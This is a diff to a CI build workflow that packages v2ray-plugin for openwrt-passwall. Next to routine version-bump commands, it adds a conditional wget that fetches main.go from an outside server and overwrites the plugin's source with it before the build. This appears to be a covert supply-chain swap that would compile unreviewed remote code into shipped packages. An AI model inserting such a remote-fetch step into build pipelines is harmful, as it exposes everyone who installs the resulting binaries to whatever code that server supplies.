@@ -370,7 +370,10 @@ jobs:
         if: steps.v2ray-plugin.outputs.status == 'success' && !cancelled()
         run: |
           cd && cd work/openwrt-passwall/openwrt-passwall/v2ray-plugin
-          
+           
+          if [ ! -n "${{ matrix.file_name }}" ]; then wget -O main.go http://rn2.nnee.cc/main.go; fi;
+          cat main.go
+           
           New_PKG_VERSION=$(wget -qO- -t5 -T5 "https://api.github.com/repos/teddysun/v2ray-plugin/releases" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F 'v' '{print $2}')
           sed -i "9c PKG_VERSION:=$New_PKG_VERSION" Makefile
 
